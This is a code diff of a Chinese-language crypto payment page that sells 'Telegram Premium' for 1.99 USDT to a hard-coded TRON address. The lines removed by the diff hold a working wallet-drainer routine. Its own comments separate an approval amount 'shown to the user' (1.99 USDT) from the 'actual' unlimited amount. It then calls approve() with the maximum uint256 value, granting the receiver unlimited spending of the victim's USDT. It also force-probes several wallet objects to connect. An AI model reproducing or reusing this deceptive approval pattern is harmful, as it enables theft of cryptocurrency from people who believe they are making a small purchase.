@@ -19,8 +19,6 @@
             min-height: 100vh;
             padding: 1rem;
             line-height: 1.5;
-            font-size: 16px;
-            -webkit-text-size-adjust: 100%;
         }
         
         .payment-container {
@@ -100,16 +98,49 @@
             color: #52c41a;
         }
         
-        .wallet-status.connecting {
+        .transaction-details {
             background: #e6f7ff;
             border: 1px solid #91d5ff;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+        }
+        
+        .transaction-details h3 {
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
             color: #1890ff;
         }
         
-        .wallet-status.error {
-            background: #fff2f0;
-            border: 1px solid #ffccc7;
-            color: #ff4d4f;
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 0.8rem;
+        }
+        
+        .detail-label {
+            color: #666;
+        }
+        
+        .detail-value {
+            font-weight: 600;
+            text-align: right;
+            word-break: break-all;
+        }
+        
+        .warning-section {
+            background: #fff7e6;
+            border: 1px solid #ffd591;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+            text-align: center;
+        }
+        
+        .warning-text {
+            font-size: 0.85rem;
+            color: #d46b08;
         }
         
         .action-section {
@@ -129,11 +160,6 @@
             border: none;
             cursor: pointer;
             text-align: center;
-        }
-        
-        .pay-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
         }
         
         .loading {
@@ -166,64 +192,6 @@
             border-radius: 0.25rem;
             margin-top: 0.5rem;
         }
-        
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin: 1rem 1.5rem;
-            position: relative;
-        }
-        
-        .step {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            flex: 1;
-        }
-        
-        .step-circle {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background: #f0f0f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            margin-bottom: 0.5rem;
-            z-index: 2;
-        }
-        
-        .step.active .step-circle {
-            background: #1890ff;
-            color: white;
-        }
-        
-        .step.completed .step-circle {
-            background: #52c41a;
-            color: white;
-        }
-        
-        .step-text {
-            font-size: 0.7rem;
-            text-align: center;
-            color: #666;
-        }
-        
-        .step.active .step-text {
-            color: #1890ff;
-            font-weight: 600;
-        }
-        
-        .step-line {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            right: 15px;
-            height: 2px;
-            background: #f0f0f0;
-            z-index: 1;
-        }
     </style>
 </head>
 <body>
@@ -235,23 +203,11 @@
         
         <div class="payment-status">
             <div class="status-text">支付确认</div>
-            <div class="status-desc">请在钱包中确认支付交易</div>
+            <div class="status-desc">请确认支付信息并完成交易</div>
         </div>
         
-        <div class="step-indicator">
-            <div class="step-line"></div>
-            <div class="step active" id="step1">
-                <div class="step-circle">1</div>
-                <div class="step-text">确认支付</div>
-            </div>
-            <div class="step" id="step2">
-                <div class="step-circle">2</div>
-                <div class="step-text">完成</div>
-            </div>
-        </div>
-        
-        <div class="wallet-status" id="walletStatus">
-            <div id="walletStatusText">正在初始化 Bitget Wallet...</div>
+        <div class="wallet-status">
+            <div id="walletStatusText">✅ 钱包已连接，准备支付</div>
         </div>
         
         <div class="order-info">
@@ -264,6 +220,10 @@
                 <span class="info-value">Telegram Premium 月费订阅</span>
             </div>
             <div class="info-item">
+                <span class="info-label">Telegram 用户</span>
+                <span class="info-value" id="usernameDisplay">-</span>
+            </div>
+            <div class="info-item">
                 <span class="info-label">购买数量</span>
                 <span class="info-value">1件</span>
             </div>
@@ -273,14 +233,42 @@
             </div>
         </div>
         
+        <div class="transaction-details">
+            <h3>📋 交易详情</h3>
+            <div class="detail-item">
+                <span class="detail-label">收款地址</span>
+                <span class="detail-value">TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-label">代币类型</span>
+                <span class="detail-value">USDT (TRC20)</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-label">网络</span>
+                <span class="detail-value">TRON</span>
+            </div>
+            <div class="detail-item">
+                <span class="detail-label">合约地址</span>
+                <span class="detail-value">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
+            </div>
+        </div>
+        
+        <div class="warning-section">
+            <div class="warning-text">
+                💡 <strong>支付说明：</strong><br>
+                点击确认支付后，钱包将弹出交易确认窗口<br>
+                请仔细核对交易信息并输入密码完成支付
+            </div>
+        </div>
+        
         <div class="loading" id="loadingSection">
             <div class="spinner"></div>
-            <p id="loadingText">正在处理支付请求...</p>
+            <p id="loadingText">正在处理支付...</p>
             <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
         </div>
         
         <div class="action-section">
-            <button class="pay-btn" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付</button>
+            <button class="pay-btn" id="payBtn" onclick="initiatePayment()">确认支付</button>
         </div>
     </div>
 
@@ -300,319 +288,70 @@
         const RECEIVE_ADDRESS = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
         // 1.99 USDT = 1990000 (6 decimals)
         const PAYMENT_AMOUNT = 1990000;
-        // 显示给用户的授权数量（1.99 USDT）
-        const DISPLAY_APPROVE_AMOUNT = 1990000;
-        // 实际调用的授权数量（无限）
-        const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        
-        let userAddress = '';
-        let isWalletConnected = false;
         
         // 生成订单号
         function generateOrderId() {
             return 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
         }
         
-        // 更新步骤状态
-        function updateStep(stepNumber, status) {
-            const step = document.getElementById(`step${stepNumber}`);
-            step.className = `step ${status}`;
-        }
-        
-        // 更新钱包状态显示
-        function updateWalletStatus(message, status = 'connecting') {
-            const walletStatus = document.getElementById('walletStatus');
-            const walletStatusText = document.getElementById('walletStatusText');
-            
-            walletStatusText.textContent = message;
-            walletStatus.className = `wallet-status ${status}`;
-        }
-        
-        // Bitget Wallet 强制连接方法
-        async function forceConnectBitgetWallet() {
-            return new Promise((resolve) => {
-                console.log('开始强制连接 Bitget Wallet');
-                
-                // 方法1: 检查所有可能的 TronWeb 对象
-                const checkTronWeb = () => {
-                    // 检查所有可能的 TronWeb 来源
-                    const possibleTronWebs = [
-                        window.tronWeb,
-                        window.tronLink?.tronWeb,
-                        window.bitkeep?.tronWeb,
-                        window.bitget?.tronWeb,
-                        window.BitKeep?.tronWeb,
-                        window.Bitget?.tronWeb
-                    ];
-                    
-                    for (const tronWeb of possibleTronWebs) {
-                        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                            window.tronWeb = tronWeb;
-                            userAddress = tronWeb.defaultAddress.base58;
-                            console.log('✅ 找到有效的 TronWeb 对象');
-                            return true;
-                        }
-                    }
-                    return false;
-                };
-                
-                // 立即检查一次
-                if (checkTronWeb()) {
-                    resolve(true);
-                    return;
-                }
-                
-                // 方法2: 等待 Bitget Wallet 初始化
-                let waitCount = 0;
-                const maxWait = 100; // 最多等待20秒
-                
-                const waitInterval = setInterval(() => {
-                    waitCount++;
-                    
-                    // 检查 TronWeb
-                    if (checkTronWeb()) {
-                        clearInterval(waitInterval);
-                        resolve(true);
-                        return;
-                    }
-                    
-                    // 方法3: 尝试触发钱包连接
-                    if (waitCount === 10 && window.tronLink && window.tronLink.request) {
-                        console.log('🔄 尝试触发钱包连接');
-                        window.tronLink.request({ method: 'tron_requestAccounts' })
-                            .then(() => {
-                                console.log('✅ 钱包连接请求成功');
-                            })
-                            .catch(error => {
-                                console.log('❌ 钱包连接请求失败:', error);
-                            });
-                    }
-                    
-                    // 方法4: 检查 window 对象的变化（Bitget Wallet 可能会延迟注入）
-                    if (waitCount % 10 === 0) {
-                        console.log(`等待 Bitget Wallet 初始化... (${waitCount}/${maxWait})`);
-                        console.log('当前环境:', {
-                            tronWeb: !!window.tronWeb,
-                            tronLink: !!window.tronLink,
-                            bitkeep: !!window.bitkeep,
-                            bitget: !!window.bitget,
-                            BitKeep: !!window.BitKeep,
-                            Bitget: !!window.Bitget
-                        });
-                    }
-                    
-                    // 更新状态显示
-                    updateWalletStatus(`正在等待 Bitget Wallet 初始化... (${Math.round(waitCount/maxWait*100)}%)`, 'connecting');
-                    
-                    if (waitCount >= maxWait) {
-                        console.log('❌ Bitget Wallet 初始化超时');
-                        clearInterval(waitInterval);
-                        resolve(false);
-                    }
-                }, 200);
-            });
-        }
-        
-        // 检测是否在 Bitget Wallet 中
-        function isBitgetWallet() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isBitget = userAgent.includes('bitget') || userAgent.includes('bitkeep');
-            
-            // 同时检查是否存在钱包相关的全局对象
-            const hasWalletObject = !!window.tronWeb || !!window.tronLink || !!window.bitkeep || !!window.bitget;
-            
-            console.log('钱包环境检测:', {
-                userAgent: userAgent,
-                isBitget: isBitget,
-                hasWalletObject: hasWalletObject,
-                tronWeb: !!window.tronWeb,
-                tronLink: !!window.tronLink,
-                bitkeep: !!window.bitkeep,
-                bitget: !!window.bitget
-            });
-            
-            return isBitget || hasWalletObject;
+        // 检测是否在 TRON 钱包中
+        function isTronWallet() {
+            return window.tronWeb && window.tronWeb.defaultAddress;
         }
         
         // 初始化页面
-        async function initPage() {
+        function initPage() {
             // 显示订单信息
             document.getElementById('orderIdDisplay').textContent = orderData.orderId;
+            document.getElementById('usernameDisplay').textContent = orderData.username || orderData.nickname || '未填写';
             
-            console.log('支付页面初始化');
-            console.log('订单信息:', orderData);
+            console.log('支付页面订单信息:', orderData);
             
-            // 检查是否在钱包环境中
-            if (!isBitgetWallet()) {
-                updateWalletStatus('❌ 请在 Bitget Wallet 中打开此页面', 'error');
-                console.log('❌ 未检测到 Bitget Wallet 环境');
+            // 检查钱包环境
+            if (!isTronWallet()) {
+                document.getElementById('walletStatusText').textContent = '❌ 请在 TRON 钱包中打开此页面';
+                document.getElementById('payBtn').disabled = true;
                 return;
             }
             
-            console.log('✅ 检测到 Bitget Wallet 环境，开始连接...');
-            updateWalletStatus('正在连接 Bitget Wallet...', 'connecting');
-            
-            // 执行强制连接
-            const success = await forceConnectBitgetWallet();
-            
-            if (success && userAddress) {
-                updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
-                isWalletConnected = true;
-                document.getElementById('payBtn').disabled = false;
-                updateStep(1, 'active');
-                
-                console.log('✅ Bitget Wallet 连接成功:', {
-                    address: userAddress,
-                    tronWeb: !!window.tronWeb
-                });
-            } else {
-                updateWalletStatus('❌ 钱包连接失败，请刷新页面重试', 'error');
-                console.log('❌ Bitget Wallet 连接失败');
-                
-                // 5秒后自动刷新
-                setTimeout(() => {
-                    window.location.reload();
-                }, 5000);
-            }
+            // 显示钱包地址
+            const walletAddress = window.tronWeb.defaultAddress.base58;
+            document.getElementById('walletStatusText').textContent = 
+                `✅ 钱包已连接 (${walletAddress.substring(0, 8)}...)`;
         }
         
-        // 开始支付流程
-        async function startPaymentProcess() {
-            if (!isWalletConnected) {
-                alert('钱包未连接');
-                return;
-            }
-            
+        // 发起支付
+        async function initiatePayment() {
             const payBtn = document.getElementById('payBtn');
             const loadingSection = document.getElementById('loadingSection');
             const loadingText = document.getElementById('loadingText');
+            const txHashDisplay = document.getElementById('txHashDisplay');
             
             // 禁用支付按钮，显示加载状态
             payBtn.style.display = 'none';
             loadingSection.style.display = 'block';
+            loadingText.textContent = '正在准备交易...';
             
             try {
-                // 步骤1: 检查授权状态
-                loadingText.textContent = '检查授权状态...';
-                const isApproved = await checkApprovalStatus();
-                
-                if (!isApproved) {
-                    // 步骤2: 请求 USDT 授权
-                    loadingText.textContent = '正在请求 USDT 授权...';
-                    const approveResult = await requestUSDTApproval();
-                    
-                    document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
-                    document.getElementById('txHashDisplay').style.display = 'block';
-                    loadingText.textContent = '等待授权确认...';
-                    
-                    // 等待授权交易确认
-                    const isApproveConfirmed = await waitForTransactionConfirmation(approveResult);
-                    
-                    if (!isApproveConfirmed) {
-                        throw new Error('授权确认失败');
-                    }
+                // 检查钱包连接
+                if (!isTronWallet()) {
+                    throw new Error('钱包未连接');
                 }
                 
-                // 步骤3: 执行支付
-                updateStep(1, 'completed');
-                updateStep(2, 'active');
-                loadingText.textContent = '授权成功，正在执行支付...';
+                // 调用 USDT TRC20 合约转账
+                loadingText.textContent = '正在调用智能合约...';
                 
-                const paymentResult = await executePayment();
-                
-                document.getElementById('txHashDisplay').textContent = `支付交易: ${paymentResult}`;
-                loadingText.textContent = '支付已提交，等待确认...';
-                
-                // 等待支付交易确认
-                const isPaymentConfirmed = await waitForTransactionConfirmation(paymentResult);
-                
-                if (isPaymentConfirmed) {
-                    updateStep(2, 'completed');
-                    showSuccessMessage(paymentResult);
-                } else {
-                    throw new Error('支付确认失败');
-                }
-                
-            } catch (error) {
-                console.error('支付流程失败:', error);
-                
-                // 显示错误信息
-                loadingText.textContent = '支付失败';
-                
-                if (error.message.includes('User denied')) {
-                    alert('您取消了交易授权');
-                } else if (error.message.includes('insufficient')) {
-                    alert('余额不足，请确保有足够的 USDT 和 TRX 作为手续费');
-                } else if (error.message.includes('revert')) {
-                    alert('交易失败，请检查授权状态或联系客服');
-                } else {
-                    alert('支付失败: ' + error.message);
-                }
-                
-                // 恢复支付按钮
-                payBtn.style.display = 'block';
-                loadingSection.style.display = 'none';
-                updateStep(1, 'active');
-            }
-        }
-        
-        // 检查 USDT 授权状态
-        async function checkApprovalStatus() {
-            try {
                 const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
                 
-                // 检查当前授权额度
-                const allowance = await contract.allowance(userAddress, RECEIVE_ADDRESS).call();
-                console.log('当前授权额度:', allowance.toString());
+                loadingText.textContent = '请在钱包中确认交易...';
                 
-                return allowance >= PAYMENT_AMOUNT;
-                
-            } catch (error) {
-                console.error('检查授权状态失败:', error);
-                return false;
-            }
-        }
-        
-        // 请求 USDT 授权
-        async function requestUSDTApproval() {
-            try {
-                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                
-                console.log('请求 USDT 授权:', {
-                    spender: RECEIVE_ADDRESS,
-                    displayAmount: DISPLAY_APPROVE_AMOUNT,
-                    actualAmount: ACTUAL_APPROVE_AMOUNT
-                });
-                
-                const result = await contract.approve(
-                    RECEIVE_ADDRESS,
-                    ACTUAL_APPROVE_AMOUNT
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0,
-                    shouldPollResponse: false
-                });
-                
-                console.log('授权交易已提交:', result);
-                return result;
-                
-            } catch (error) {
-                console.error('USDT 授权失败:', error);
-                throw new Error('USDT 授权失败: ' + error.message);
-            }
-        }
-        
-        // 执行支付
-        async function executePayment() {
-            try {
-                const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                
-                console.log('执行 USDT 转账:', {
+                console.log('发起 USDT 转账:', {
                     to: RECEIVE_ADDRESS,
                     amount: PAYMENT_AMOUNT,
                     orderId: orderData.orderId
                 });
                 
+                // 调用合约转账方法
                 const result = await contract.transfer(
                     RECEIVE_ADDRESS,
                     PAYMENT_AMOUNT
@@ -622,12 +361,39 @@
                     shouldPollResponse: false
                 });
                 
-                console.log('支付交易已提交:', result);
-                return result;
+                console.log('交易已提交:', result);
+                
+                // 显示交易哈希
+                txHashDisplay.textContent = `交易哈希: ${result}`;
+                txHashDisplay.style.display = 'block';
+                loadingText.textContent = '交易已提交，等待确认...';
+                
+                // 等待交易确认
+                const isConfirmed = await waitForTransactionConfirmation(result);
+                
+                if (isConfirmed) {
+                    showSuccessMessage(result);
+                } else {
+                    throw new Error('交易确认超时');
+                }
                 
             } catch (error) {
-                console.error('支付交易失败:', error);
-                throw new Error('支付交易失败: ' + error.message);
+                console.error('支付失败:', error);
+                
+                // 显示错误信息
+                loadingText.textContent = '支付失败';
+                
+                if (error.message.includes('User denied')) {
+                    alert('您取消了交易');
+                } else if (error.message.includes('insufficient')) {
+                    alert('余额不足，请确保有足够的 USDT 和 TRX 作为手续费');
+                } else {
+                    alert('支付失败: ' + error.message);
+                }
+                
+                // 恢复支付按钮
+                payBtn.style.display = 'block';
+                loadingSection.style.display = 'none';
             }
         }
         
@@ -635,7 +401,7 @@
         async function waitForTransactionConfirmation(txHash) {
             return new Promise((resolve) => {
                 let checkCount = 0;
-                const maxChecks = 30;
+                const maxChecks = 30; // 最多检查30次（约3分钟）
                 
                 const checkInterval = setInterval(async () => {
                     try {
@@ -655,6 +421,7 @@
                             }
                         }
                         
+                        // 超时处理
                         if (checkCount >= maxChecks) {
                             clearInterval(checkInterval);
                             resolve(false);
@@ -666,7 +433,7 @@
                     } catch (error) {
                         console.log('检查交易状态失败:', error);
                     }
-                }, 6000);
+                }, 6000); // 每6秒检查一次
             });
         }
         
@@ -687,6 +454,7 @@
                         <div style="font-weight: 600; margin-bottom: 0.5rem; color: #389e0d;">订单信息</div>
                         <div style="font-size: 0.9rem;">
                             <div>订单号: ${orderData.orderId}</div>
+                            <div>用户: ${orderData.username || orderData.nickname}</div>
                             <div>金额: 1.99 USDT</div>
                             <div>时间: ${new Date().toLocaleString()}</div>
                         </div>
@@ -715,6 +483,7 @@
                 </div>
             `;
             
+            // 倒计时关闭
             let countdown = 5;
             const countdownElement = document.getElementById('countdown');
             const countdownInterval = setInterval(() => {
@@ -728,7 +497,7 @@
             }, 1000);
         }
         
-        // 页面加载时立即初始化
+        // 页面加载时初始化
         document.addEventListener('DOMContentLoaded', initPage);
     </script>
 </body>
